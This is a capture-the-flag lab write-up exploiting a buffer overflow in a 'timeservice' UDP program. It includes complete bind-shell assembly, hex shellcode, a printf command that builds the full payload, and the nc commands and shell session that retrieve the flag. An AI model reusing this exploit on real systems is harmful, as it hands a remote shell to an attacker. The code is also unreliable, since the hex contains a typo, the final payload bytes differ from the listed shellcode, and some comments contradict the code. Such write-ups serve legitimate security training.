# Buffer Overflow Exploit Writeup

## Introduction

This writeup describes the steps I took to exploit a buffer overflow vulnerability in the timeservice program to execute a bind shell and capture the flag. Below are the details of my approach, debugging, payload construction, and exploitation process.

## Understanding the Vulnerability

The first step was to analyze the timeservice.c source code to identify possible vulnerabilities. I observed that the program created child processes and used functions susceptible to buffer overflow. This analysis helped me determine areas to target, such as the use of unsafe functions and lack of input validation.

The specific vulnerability exists in the timbuf (local timebuf array) inside the get_time function. Here's the analysis:

Vulnerable Code:

char timebuf[TIMEBUFSIZE];
...
memcpy(timebuf, format, received);

timebuf has a fixed size of TIMEBUFSIZE (128 bytes).

The memcpy call copies received bytes from the format buffer (supplied by the user via msgbuf) into timebuf, without verifying whether received is larger than TIMEBUFSIZE.

Exploitation:

If the user sends a payload larger than 128 bytes (TIMEBUFSIZE), this will overflow the timebuf buffer.

This allows the attacker to overwrite adjacent memory, including return addresses or other control structures, leading to arbitrary code execution or a crash.

Further Confirmation:

The vulnerability is exacerbated by the fact that msgbuf is directly used as the format string in the get_time function:

get_time(msgbuf, returnstr, received);

msgbuf is populated directly from user input via recvfrom:

received = recvfrom(sd, msgbuf, MSGBUFSIZE, MSG_WAITALL, ...);

If received is larger than TIMEBUFSIZE, get_time will not validate this before copying msgbuf into timebuf.

Summary:

The buffer overflow vulnerability lies in the memcpy operation on the timebuf array in the get_time function.

By sending a payload larger than 128 bytes (but smaller than or equal to 256 bytes to fit msgbuf), an attacker can exploit this vulnerability to execute arbitrary code or crash the program.

This aligns with the overflow that occurred at 148 bytes, which included padding, shellcode, and the return address.

Next, I compiled the timeservice program using the provided Makefile. To enable debugging, I executed the following:

make all-debug

This allowed me to generate an executable with debug symbols, making it easier to trace the program’s execution using GDB.

Debugging with GDB

To understand the program’s execution flow, I used GDB to set breakpoints and analyze memory and registers. Here are the steps I followed:

## Breakpoints on Process Creation:

I set breakpoints at the first and second fork calls to trace both parent and child processes:

break 86
break 147
break get_time
run 127.0.0.1 2222
set follow-fork-mode child
next
continue 
and in another terminal i sent a payload Echo -e “aaaaaa” | nc -u 127.0.0.1 2222
set follow-fork-mode child
next 
continue 
we did all these steps to check if the program works


Input Length Testing:

Using trial and error, I sent varying input lengths to the program via Netcat to determine when the buffer overflow occurred. I observed that an overflow happened when I sent 148 bytes.

## Payload Construction

Based on the buffer overflow size, I constructed the following payload:

Structure of the Payload:

Null Byte (\x00): Ensures null-termination for compatibility.

NOP Sled (\x90 * 42): Provides a landing zone for reliable execution.

Shellcode (101 bytes): Executes the bind shell from the assembly code.

Return Address (4 bytes): Points to the start of the NOP sled in memory.

### Shellcode Details:

The shellcode was crafted to create a bind shell listening on port 2345.

Here is the assembly code used for the shellcode:

global _start
section .text

_start:
    xor eax, eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    mov ecx, esp
    mov bl, 1
    mov al, 0x66
    int 0x80
    mov esi, eax

    xor eax, eax
    xor ebx, ebx
    push ebx
    push word 0x0929
    push word 0x2
    mov ecx, esp
    push 0x10
    push ecx
    push esi
    mov ecx, esp
    mov bl, 2
    mov al, 0x66
    int 0x80

    xor ebx, ebx
    push ebx
    push esi
    mov ecx, esp
    mov bl, 4
    mov al, 0x66
    int 0x80

    xor ebx, ebx
    push ebx
    push ebx
    push esi
    mov ecx, esp
    mov bl, 5
    mov al, 0x66
    int 0x80
    mov edi, eax

    xor ecx, ecx
dup2_loop:
    mov al, 0x3f
    int 0x80
    inc ecx
    cmp ecx, 3
    jne dup2_loop

    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    xor ecx, ecx
    mov edx, ecx
    mov al, 0xb
    int 0x80

The compiled shellcode in hexadecimal:

\x31\xc0\x50\x40\x50\x40\x50\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6
\x31\xc0\x31\xdb\x53\x66\x68\x09/x29\x66\x6a\x02\x89\xe1\x6a\x10\x51
\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x31\xdb\x53\x56\x89\xe1\xb3\x04
\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80
\x89\xc7\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03\x75\xf6\x31\xc0\x50
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x89\xca\xb0
\x0b\xcd\x80

### Detailed Explanation of the Assembly Code

The provided assembly code creates a bind shell that listens on port 2345. Below is a step-by-step breakdown of each part of the code:

1. Clear EAX

xor eax, eax
Clears the eax register by XORing it with itself.
This is a common technique to set a register to zero without using additional instructions.
2. Create a Socket

push eax             ; Push 0 (IPPROTO_IP)
inc eax              ; EAX = 1 (SOCK_STREAM)
push eax             ; Push 1 (SOCK_STREAM)
inc eax              ; EAX = 2 (AF_INET)
push eax             ; Push 2 (AF_INET)
mov ecx, esp         ; ECX = &[AF_INET, SOCK_STREAM, IPPROTO_IP]
mov bl, 1            ; EBX = 1 (SYS_SOCKET)
mov al, 0x66         ; EAX = sys_socketcall
int 0x80             ; Call kernel
mov esi, eax         ; ESI = socket_fd
Purpose: This block creates a socket for communication.
Explanation:
Pushes the arguments for the socket(AF_INET, SOCK_STREAM, IPPROTO_IP) system call onto the stack in reverse order:
AF_INET (Address Family for IPv4) = 2
SOCK_STREAM (TCP connection) = 1
IPPROTO_IP = 0
Sets up the registers for the sys_socketcall system call:
eax = 0x66 (system call number for sys_socketcall)
ebx = 1 (operation code for socket)
ecx points to the stack containing the arguments.
Executes the system call with int 0x80, which creates the socket and returns the file descriptor in eax.
Stores the socket file descriptor in esi for future use.
3. Bind the Socket

xor eax, eax         ; Clear EAX
xor ebx, ebx         ; Clear EBX
push ebx             ; INADDR_ANY (0.0.0.0)
push word 0x2909     ; Port 2345 (big-endian format)
push word 0x2        ; AF_INET
mov ecx, esp         ; ECX = sockaddr
push 0x10            ; sizeof(sockaddr)
push ecx             ; Push &sockaddr
push esi             ; Push socket_fd
mov ecx, esp         ; ECX = &[socket_fd, sockaddr, sizeof(sockaddr)]
mov bl, 2            ; EBX = 2 (SYS_BIND)
mov al, 0x66         ; EAX = sys_socketcall
int 0x80             ; Call kernel
Purpose: This block binds the socket to all interfaces (0.0.0.0) and port 2345.
Explanation:
Pushes the sockaddr structure onto the stack:
AF_INET = 2
Port 2345 = 0x0929 in big-endian format.
INADDR_ANY = 0 (binds to all available interfaces).
Pushes additional arguments for the bind system call:
The size of the sockaddr structure (16 bytes).
A pointer to the sockaddr structure.
The socket file descriptor.
Sets up the registers for the sys_socketcall system call:
eax = 0x66 (system call number for sys_socketcall).
ebx = 2 (operation code for bind).
ecx points to the stack containing the arguments.
Executes the system call with int 0x80.
4. Listen on the Socket

xor ebx, ebx         ; Clear EBX
push ebx             ; backlog = 0
push esi             ; socket_fd
mov ecx, esp         ; ECX = &[socket_fd, backlog]
mov bl, 4            ; EBX = 4 (SYS_LISTEN)
mov al, 0x66         ; EAX = sys_socketcall
int 0x80             ; Call kernel
Purpose: This block puts the socket into a listening state to accept incoming connections.
Explanation:
Pushes the arguments for the listen system call onto the stack:
The backlog size (0 in this case, meaning no queue).
The socket file descriptor.
Sets up the registers for the sys_socketcall system call:
eax = 0x66 (system call number for sys_socketcall).
ebx = 4 (operation code for listen).
ecx points to the stack containing the arguments.
Executes the system call with int 0x80.
5. Accept a Connection

xor ebx, ebx         ; Clear EBX
push ebx             ; NULL (socklen)
push ebx             ; NULL (sockaddr)
push esi             ; socket_fd
mov ecx, esp         ; ECX = &[socket_fd, sockaddr, socklen]
mov bl, 5            ; EBX = 5 (SYS_ACCEPT)
mov al, 0x66         ; EAX = sys_socketcall
int 0x80             ; Call kernel
mov edi, eax         ; EDI = client_fd
Purpose: This block accepts an incoming connection on the listening socket.
Explanation:
Pushes the arguments for the accept system call onto the stack:
socklen and sockaddr are set to NULL.
The socket file descriptor.
Sets up the registers for the sys_socketcall system call:
eax = 0x66 (system call number for sys_socketcall).
ebx = 5 (operation code for accept).
ecx points to the stack containing the arguments.
Executes the system call with int 0x80.
Stores the new client file descriptor in edi.
6. Redirect Standard Streams

xor ecx, ecx         ; ECX = 0 (stdin)
dup2_loop:
    mov al, 0x3f     ; EAX = sys_dup2
    int 0x80         ; Call kernel
    inc ecx          ; ECX++
    cmp ecx, 3       ; Loop until ECX = 3
    jne dup2_loop
Purpose: Redirects stdin, stdout, and stderr to the client file descriptor (edi).
Explanation:
Loops through the standard file descriptors (0, 1, and 2).
Executes the dup2 system call to duplicate the client file descriptor (edi) onto each of the standard streams.
7. Execute /bin/sh

xor eax, eax         ; Clear EAX
push eax             ; NULL (envp)
push 0x68732f6e      ; Push "n/sh"
push 0x69622f2f      ; Push "//bi"
mov ebx, esp         ; EBX = pointer to "/bin/sh"
xor ecx, ecx         ; NULL (argv)
mov edx, ecx         ; NULL (envp)
mov al, 0xb          ; EAX = sys_execve
int 0x80             ; Call kernel
Purpose: Launches an interactive /bin/sh shell.
Explanation:
Pushes the string /bin/sh onto the stack in reverse order for proper alignment.
Sets up the arguments for the execve system call:
ebx points to /bin/sh.
ecx and edx are NULL (no arguments or environment variables).
Executes the execve system call (eax = 0xb).

### Final Notes

This shellcode works by:
Creating a socket.
Binding it to port 2345.
Listening for incoming connections.
Accepting a client connection.
Redirecting standard streams to the client.
Spawning a shell for interactive use.


## Return Address
The return address used in the exploit was \x06\xb3\x04\x08, which corresponds to an offset within the msgbuf buffer (0x804b300). This address was chosen because msgbuf directly contains the payload, including the NOP sled and the shellcode.

Rather than using the exact start of msgbuf (0x804b300), an offset (0x804b306) was used. This ensures the program's execution bypasses any non-executable data, such as the null byte (\x00) at the start of the payload. Instead, the return address lands within the NOP sled, which allows the CPU to "slide" through the NOP instructions until it reaches the shellcode.

This approach is critical because:

The payload resides in msgbuf, making it the logical target for the return address.
The offset ensures that the execution skips any problematic or non-executable bytes and lands safely within the NOP sled.
It accounts for potential variations in how the stack or memory layout behaves during runtime.
By overwriting the return address with 0x804b306, the exploit redirected execution flow to msgbuf, effectively executing the injected shellcode.

## Execution

Here are the steps I followed to execute the payload and gain access:

### Payload Creation:

printf "\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x40\x50\x89\xc3\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xdb\x53\x66\x68\x09\x29\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x31\xdb\x53\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xd9\x83\xe9\x03\x89\xc3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80\x06\xb3\x04\x08" > pay1.bin

### Send Payload:

cat pay1.bin | nc -u time 2222

### Connect to Shell:

nc time 2345
whoami
time
cd ../
ls
flag.txt
guestbook.txt
service
cat flag.txt
CTF{secret-T8ixjP5GKtZvnsjhHwvX}

## Conclusion
The payload worked as intended. I successfully executed the buffer overflow attack, exploited the vulnerability, and launched a bind shell on the target server. By connecting to the bind shell using nc time 2345, I gained access and retrieved the flag, confirming the exploit's success.